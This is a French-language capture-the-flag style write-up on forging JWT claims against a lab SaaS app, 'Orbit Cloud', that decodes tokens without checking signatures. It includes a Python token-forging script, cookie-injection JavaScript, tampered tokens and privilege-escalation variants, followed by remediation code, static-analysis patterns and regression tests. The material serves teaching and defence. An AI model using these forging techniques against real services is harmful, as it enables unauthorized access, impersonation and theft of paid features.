# Write-up : Manipulation des claims JWT par absence de vérification de signature

---

## Résumé exécutif

La manipulation de claims par absence de vérification de signature est une vulnérabilité dans laquelle un serveur décode un JWT sans contrôler l'intégrité cryptographique de sa signature. Un attaquant peut alors modifier n'importe quelle valeur du payload (booléens, chaînes, entiers) et accéder à des ressources normalement protégées. Cette faille est particulièrement insidieuse car elle ne nécessite aucun outil d'attaque sophistiqué : modifier un caractère dans un JWT suffit.

- **Sévérité** : Critique (CVSS 9.4)
- **CWE** : CWE-347 (Improper Verification of Cryptographic Signature)
- **Catégorie OWASP** : A02:2021 — Cryptographic Failures / A01:2021 — Broken Access Control
- **Impact** : Accès à des fonctionnalités payantes, contournement de restrictions métier
- **Exploitabilité** : Triviale, aucun secret requis

---

## 1. Rappel sur la structure des JWT

Un JWT comporte trois parties encodées en base64url et séparées par des points :

```
header.payload.signature
```

La signature est calculée sur les deux premières parties avec un algorithme cryptographique (généralement HMAC-SHA256 ou RSA-SHA256). Sa fonction est double :

- Garantir l'intégrité du contenu : header et payload n'ont pas été altérés
- Authentifier l'émetteur : seule une partie connaissant la clé peut produire une signature valide

Si la signature n'est pas vérifiée, le JWT n'offre plus aucune garantie. Il devient un simple conteneur JSON modifiable par n'importe qui.

---

## 2. Principe de la vulnérabilité

### 2.1 Le mécanisme

Certaines implémentations décodent le payload d'un JWT sans vérifier la signature, puis prennent des décisions d'autorisation à partir des valeurs lues. La logique est la suivante :

1. Lire le token depuis le cookie ou le header Authorization
2. Décoder la partie payload en base64url
3. Extraire les claims nécessaires (rôle, abonnement, statut)
4. Accorder ou refuser l'accès selon ces claims

L'étape 3 utilise des données non vérifiées pour prendre une décision sensible.

### 2.2 Le piège du décodage

Un développeur peut penser que "décoder" équivaut à "valider". Ce n'est pas le cas. Un décodeur base64url est trivial à utiliser et ne fait aucune vérification cryptographique. C'est simplement un convertisseur de format.

```python
# Décodage : aucune sécurité
import base64, json
payload = json.loads(base64.urlsafe_b64decode(token.split(".")[1]))
```

À l'inverse, une vérification complète implique de recalculer la signature attendue et de la comparer en temps constant.

```python
# Vérification : sécurité complète
import hmac, hashlib
expected = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
if not hmac.compare_digest(expected, signature):
    raise ValueError("Signature invalide")
```

### 2.3 Pourquoi c'est dangereux

La signature est l'unique mécanisme qui empêche un client de modifier le contenu du JWT. Sans elle :

- Un utilisateur peut changer son rôle
- Un abonné gratuit peut s'attribuer un statut premium
- Un compte désactivé peut redevenir actif
- Les restrictions métier disparaissent

---

## 3. Contexte

Cette vulnérabilité apparaît régulièrement dans des applications qui implémentent leur propre logique JWT sans utiliser de bibliothèque éprouvée, ou qui utilisent une bibliothèque en désactivant explicitement la vérification pour des raisons de simplicité.

Exemples d'occurrences connues :

| Type d'application | Claim ciblé | Impact |
|---------------------|-------------|--------|
| SaaS freemium | `isPremium`, `plan` | Accès gratuit aux fonctionnalités payantes |
| Plateformes de streaming | `subscription`, `tier` | Contournement de l'abonnement |
| API avec quotas | `rate_limit`, `requests_left` | Suppression des limites |
| Applications multi-tenant | `tenant_id`, `org` | Accès à d'autres organisations |
| Jeux en ligne | `level`, `unlocked` | Déblocage de contenus payants |

La faille est référencée dans le Top 10 OWASP sous A02:2021 (Cryptographic Failures) et A01:2021 (Broken Access Control).

---

## 4. Environnement du laboratoire

### 4.1 Application cible

Orbit Cloud est une plateforme SaaS proposant deux niveaux d'abonnement :

- Plan Free : fonctionnalités basiques, quota de stockage limité
- Plan Premium : fonctionnalités avancées, quotas étendus

L'accès aux fonctionnalités Premium est contrôlé par un claim booléen `isPremium` dans le JWT.

### 4.2 Comptes de test

```
Utilisateur gratuit : alice / alice123 (isPremium: false)
Utilisateur premium : bob / bob123   (isPremium: true)
```

### 4.3 Endpoints

```
GET  /                      - Page de connexion
GET  /dashboard             - Tableau de bord utilisateur
POST /api/login             - Authentification
GET  /api/me                - Profil courant
GET  /api/premium/vulnerable - Contenu premium (signature non vérifiée)
GET  /api/premium/secure     - Contenu premium (signature vérifiée)
```

---

## 5. Analyse du code vulnérable

### 5.1 Endpoint premium vulnérable

```python
@app.route("/api/premium/vulnerable")
def premium_vulnerable():
    token = get_token()

    # Aucune vérification de signature : décodage brut
    payload = decode_unsafe(token)

    # Décision d'autorisation basée sur un claim non vérifié
    if payload.get("isPremium") is not True:
        return jsonify(ok=False, error="Accès refusé"), 403

    return jsonify(ok=True, data={
        "flag": "SPECTRA{s1gn4tur3_1s_s4cr3d}",
        ...
    })
```

### 5.2 Fonction de décodage non sécurisée

```python
def decode_unsafe(token):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("invalid format")
    return json.loads(b64d(parts[1]))
```

Cette fonction ignore complètement la troisième partie du token. Elle ne vérifie ni la signature, ni l'algorithme, ni l'expiration.

### 5.3 Anti-patterns identifiés

| Anti-pattern | Conséquence |
|--------------|-------------|
| Décodage sans vérification | Signature ignorée |
| Décision d'accès basée sur un claim | Autorisation contrôlable par le client |
| Aucune validation côté base | Pas de recoupement avec les données serveur |
| Claim booléen comme seule barrière | Un bit suffit à contourner |

---

## 6. Exploitation pas à pas

### 6.1 Reconnaissance

Connexion avec le compte gratuit :

```
POST /api/login
Content-Type: application/json

{"username":"alice","password":"alice123"}
```

Réponse :

```
Set-Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsImVtYWlsIjoiYWxpY2VAb3JiaXQuaW8iLCJpc1ByZW1pdW0iOmZhbHNlLCJwbGFuIjoiZnJlZSIsImlhdCI6MTcxOTk5OTk5OSwiZXhwIjoxNzIwMDAzNTk5fQ.xxxx
```

Décodage du payload :

```json
{
  "sub": "1",
  "username": "alice",
  "email": "alice@orbit.io",
  "isPremium": false,
  "plan": "free",
  "iat": 1719999999,
  "exp": 1720003599
}
```

### 6.2 Test initial

Tentative d'accès au contenu premium :

```
GET /api/premium/vulnerable
Cookie: token=<token légitime>
```

Réponse :

```
HTTP/1.1 403 Forbidden
{"ok": false, "error": "Accès refusé — abonnement Premium requis"}
```

### 6.3 Observation de la signature

Le token légitime se termine par une signature valide. Si l'attaquant modifie ne serait-ce qu'un caractère du payload, la signature devient mathématiquement invalide.

Test de manipulation basique : modifier `false` en `true` dans le payload. La signature ne correspond plus.

Pour vérifier que le serveur ne contrôle pas la signature, deux approches sont possibles.

**Approche 1 : modification directe du payload, signature laissée telle quelle.**

```javascript
// Payload original : {"isPremium":false,...}
// Payload modifié : {"isPremium":true,...}
// Signature : inchangée (donc invalide)
document.cookie = "token=" + nouveauPayloadBase64 + "." + signatureInchangee;
```

Si le serveur répond 200, la signature n'est pas vérifiée.

**Approche 2 : suppression pure de la signature.**

```javascript
document.cookie = "token=header.payload.";
```

Si le serveur accepte, la vérification est absente.

### 6.4 Construction du token forgé

Le token est reconstruit en trois parties.

**Header** (inchangé ou modifié) :

```json
{"alg":"HS256","typ":"JWT"}
```

**Payload** (modifié) :

```json
{
  "sub": "1",
  "username": "alice",
  "email": "alice@orbit.io",
  "isPremium": true,
  "plan": "pro",
  "iat": 1719999999,
  "exp": 1720003599
}
```

**Signature** : n'importe quelle valeur. Comme le serveur ne la vérifie pas, elle peut être vide, tronquée ou aléatoire.

Encodage base64url des deux premières parties :

```
Header  : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
Payload : eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsImVtYWlsIjoiYWxpY2VAb3JiaXQuaW8iLCJpc1ByZW1pdW0iOnRydWUsInBsYW4iOiJwcm8iLCJpYXQiOjE3MTk5OTk5OTksImV4cCI6MTcyMDAwMzU5OX0
```

Token final :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwidXNlcm5hbWUiOiJhbGljZSIsImVtYWlsIjoiYWxpY2VAb3JiaXQuaW8iLCJpc1ByZW1pdW0iOnRydWUsInBsYW4iOiJwcm8iLCJpYXQiOjE3MTk5OTk5OTksImV4cCI6MTcyMDAwMzU5OX0.invalid
```

### 6.5 Script d'exploitation

```python
import base64
import json

def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def b64url_decode(data: str) -> bytes:
    return base64.urlsafe_b64decode(data + "=" * (-len(data) % 4))

def forger_token_manipule(original_token: str, modifications: dict) -> str:
    parts = original_token.split(".")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))

    # Application des modifications
    payload.update(modifications)

    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())

    # Signature laissée volontairement invalide
    return f"{h}.{p}.invalid"

# Exemple d'utilisation
original = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
forged = forger_token_manipule(original, {
    "isPremium": True,
    "plan": "pro"
})
print(forged)
```

### 6.6 Injection du token

Le token forgé est placé dans le cookie via les DevTools ou une requête directe.

```javascript
document.cookie = "token=" + forged + "; path=/";

fetch('/api/premium/vulnerable')
  .then(r => r.json())
  .then(console.log);
```

### 6.7 Résultat

Réponse du serveur :

```
HTTP/1.1 200 OK
{
  "ok": true,
  "data": {
    "flag": "SPECTRA{s1gn4tur3_1s_s4cr3d}",
    "account": {
      "email": "alice@orbit.io",
      "plan": "pro",
      "isPremium": true,
      ...
    }
  }
}
```

L'attaquant a obtenu un accès premium en modifiant un seul booléen dans le payload.

### 6.8 Vérification sur l'endpoint corrigé

Envoi du même token forgé sur l'endpoint sécurisé :

```
GET /api/premium/secure
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...invalid
```

Réponse :

```
HTTP/1.1 401 Unauthorized
{"ok": false, "error": "Bloqué — invalid signature"}
```

Le serveur rejette le token parce que la signature ne correspond pas.

---

## 7. Variantes d'exploitation

### 7.1 Modification de `exp`

Prolonger la durée de vie d'un token expiré :

```json
{"exp": 9999999999}
```

Utile pour maintenir un accès après la fin légitime de la session.

### 7.2 Changement de `sub`

Usurper l'identité d'un autre utilisateur :

```json
{"sub": "2", "username": "bob"}
```

Si `sub` est utilisé pour identifier la ressource à retourner, l'attaquant accède aux données d'un autre utilisateur.

### 7.3 Escalade via d'autres booléens

Tout booléen d'autorisation est une cible :

```
isPremium : false -> true
isAdmin   : false -> true
verified  : false -> true
beta      : false -> true
mfa_done  : false -> true
suspended : true  -> false
```

### 7.4 Modification de tableaux

Ajouter des valeurs dans un tableau de permissions :

```json
{"permissions": ["read", "write", "delete", "admin"]}
```

### 7.5 Ajout de claims inexistants

Certaines applications lisent des claims optionnels. Ajouter `"bypass_limit": true` peut désactiver des contrôles non prévus.

### 7.6 Modification du header

Combiner avec d'autres attaques (`alg:none`, `kid` traversable, `jku` contrôlé) pour renforcer l'impact.

---

## 8. Distinction avec les autres failles JWT

| Faille | Vecteur | Signature |
|--------|---------|-----------|
| alg:none | Header modifié | Supprimée |
| Manipulation de claims | Payload modifié | Non vérifiée |
| Re-signature aveugle | Payload envoyé au serveur | Valide (re-signée par le serveur) |
| Algorithm confusion | Header modifié | Valide (HMAC avec clé publique) |
| Weak secrets | Token légitime | Valide mais crackée |

La manipulation de claims se distingue par le fait que la signature existe mais n'est pas contrôlée. Le serveur aurait les moyens de la vérifier, mais ne le fait pas.

---

## 9. Conditions d'exploitation

| Condition | Description |
|-----------|-------------|
| Décodage sans vérification | Le serveur lit le payload sans contrôler la signature |
| Claims d'autorisation dans le token | Présence de booléens ou rôles sensibles |
| Décision basée sur ces claims | Aucun recoupement avec la base |
| Endpoint accessible | L'attaquant peut atteindre la ressource protégée |

Aucune connaissance préalable n'est nécessaire. Un compte gratuit suffit.

---

## 10. Remédiation

### 10.1 Principe directeur

Deux niveaux de défense à appliquer simultanément :

1. Vérifier systématiquement la signature avant de lire le payload
2. Ne jamais faire confiance aux claims d'autorisation : consulter la source de vérité

La première mesure empêche la modification. La seconde empêche l'exploitation même si la signature était compromise (via une clé volée par exemple).

### 10.2 Vérification de signature

```python
import hmac
import hashlib
import json
import time

def jwt_decode_secure(token, secret):
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError("Format invalide")

    h_b64, p_b64, s_b64 = parts

    # Décodage
    header = json.loads(b64url_decode(h_b64))
    payload = json.loads(b64url_decode(p_b64))

    # Contrôle de l'algorithme
    if header.get("alg") != "HS256":
        raise ValueError("Algorithme non autorisé")

    # Contrôle de la signature
    expected = hmac.new(secret, f"{h_b64}.{p_b64}".encode(), hashlib.sha256).digest()
    provided = b64url_decode(s_b64)

    if not hmac.compare_digest(expected, provided):
        raise ValueError("Signature invalide")

    # Contrôle de l'expiration
    if "exp" in payload and int(payload["exp"]) < int(time.time()):
        raise ValueError("Token expiré")

    return payload
```

Points clés :

- Recalcul de la signature attendue
- Comparaison en temps constant avec `hmac.compare_digest`
- Contrôle de l'algorithme côté serveur
- Vérification de l'expiration

### 10.3 Endpoint premium corrigé

```python
@app.route("/api/premium/secure")
def premium_secure():
    token = get_token()

    try:
        payload = jwt_decode_secure(token, SECRET_KEY)
    except Exception as e:
        return jsonify(ok=False, error=f"Bloqué — {e}"), 401

    # Rechargement depuis la base : le claim du token est ignoré
    username = payload.get("username")
    if username not in USERS:
        return jsonify(ok=False, error="Utilisateur inconnu"), 401

    if not USERS[username]["isPremium"]:
        return jsonify(ok=False, error="Accès refusé"), 403

    return jsonify(ok=True, data={"message": "Accès autorisé"})
```

### 10.4 Mesures complémentaires

| Mesure | Description |
|--------|-------------|
| Vérification systématique | Aucun décodage sans contrôle de signature |
| Rechargement depuis la base | Les droits ne viennent jamais du token |
| Utilisation de bibliothèques éprouvées | PyJWT, python-jose, jose4j |
| Tests automatisés | Un token avec signature invalide doit toujours échouer |
| Journalisation | Tracer les tokens rejetés pour détecter les tentatives |
| Durée de vie courte | Limiter la fenêtre d'exploitation en cas de vol |
| Rotation des secrets | Invalider les anciens tokens |

### 10.5 Détection par analyse statique

Rechercher dans la base de code :

```
decode_unsafe
verify_signature=False
verify=False
options={"verify_signature": False}
jwt.decode(token, options={"verify_signature": False})
base64.urlsafe_b64decode(token.split(".")[1])
```

Toute lecture directe du payload sans appel à une fonction de vérification doit être auditée.

---

## 11. Tests de non-régression

```python
def test_signature_invalide_rejetee(client):
    client.post("/api/login", json={"username": "alice", "password": "alice123"})
    token = obtenir_cookie_token(client)

    # Modifier le payload sans re-signer
    forged = manipuler_payload(token, {"isPremium": True})

    r = client.get("/api/premium/secure",
                   headers={"Authorization": f"Bearer {forged}"})
    assert r.status_code == 401

def test_signature_supprimee_rejetee(client):
    client.post("/api/login", json={"username": "alice", "password": "alice123"})
    token = obtenir_cookie_token(client)

    parts = token.split(".")
    sans_signature = f"{parts[0]}.{parts[1]}."

    r = client.get("/api/premium/secure",
                   headers={"Authorization": f"Bearer {sans_signature}"})
    assert r.status_code == 401

def test_claim_non_verifie_ignore(client):
    client.post("/api/login", json={"username": "bob", "password": "bob123"})
    # Bob est premium en base, mais on retire le claim du token
    r = client.get("/api/premium/secure")
    assert r.status_code == 200
```

---

## 12. Impact métier

L'exploitation de cette vulnérabilité permet à un attaquant :

- D'accéder gratuitement à des fonctionnalités payantes (perte de revenus)
- D'utiliser des ressources facturées à la consommation (coûts opérationnels)
- De contourner les quotas et limitations (abus de service)
- D'accéder à des données réservées à certains niveaux d'abonnement
- De se faire passer pour un client premium auprès des partenaires
- De désactiver des contrôles de conformité (RGPD, sectoriels)

Sur une plateforme SaaS, cette faille peut entraîner une perte de revenus directe et une dégradation du service pour les clients légitimes.

---

## 13. Conclusion

La manipulation de claims par absence de vérification de signature illustre une confusion fréquente entre décodage et validation. Un JWT non vérifié n'est qu'un objet JSON manipulable. Il ne fournit aucune garantie d'intégrité et ne doit jamais servir de base à une décision d'autorisation.

Deux pratiques éliminent cette classe de failles :

1. Toujours vérifier la signature avant de lire un payload
2. Toujours recharger les droits depuis une source de confiance

Un JWT signé atteste l'identité d'un utilisateur. Il n'atteste pas ses privilèges actuels, qui peuvent avoir changé côté serveur. Le contrôle d'accès doit rester une décision serveur, indépendante du contenu du token.

---

## Références

- RFC 7519 — JSON Web Token (JWT)
- RFC 7515 — JSON Web Signature (JWS)
- OWASP Top 10 — A02:2021 Cryptographic Failures
- OWASP Top 10 — A01:2021 Broken Access Control
- OWASP JSON Web Token Cheat Sheet
- CWE-347 : Improper Verification of Cryptographic Signature
- PortSwigger Web Security Academy — JWT attacks
- NIST SP 800-63 — Digital Identity Guidelines
